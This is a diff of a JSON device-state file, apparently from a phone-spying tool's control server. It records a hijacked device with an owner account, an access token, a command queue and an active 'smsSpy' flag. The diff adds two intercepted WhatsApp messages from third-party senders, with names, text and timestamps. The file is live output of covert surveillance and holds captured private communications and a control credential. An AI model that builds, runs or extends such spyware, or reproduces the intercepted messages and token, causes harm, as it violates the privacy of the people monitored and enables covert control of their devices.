@@ -4,7 +4,7 @@
     "deviceName": "HP-HS100%-325B",
     "ownerUsername": "gehgtg17",
     "token": "cb1b1bec7fb91ce24a2b872769712f41",
-    "lastSeen": 1775909203615,
+    "lastSeen": 1775909215055,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T11:55:24.142Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Anda",
+        "content": "Yah",
+        "time": "11/04 19:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775909217100
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "dims",
+        "content": "jan di download kt gw",
+        "time": "11/04 19:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775909204702
+      },
       {
         "appName": "WhatsApp",
         "sender": "dims",
